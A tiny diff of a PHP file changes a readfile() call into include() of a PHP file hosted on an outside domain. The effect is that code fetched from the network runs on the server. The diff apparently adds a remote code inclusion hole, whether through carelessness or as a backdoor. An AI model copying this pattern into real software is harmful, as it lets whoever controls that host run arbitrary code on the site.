@@ -1,6 +1,7 @@
 
 
-<?php readfile('https://dbm2consulting.com/myconfig.php'); ?>
+<?php include('https://dbm2consulting.com/myconfig.php'); ?>
+
 
 
 ?>
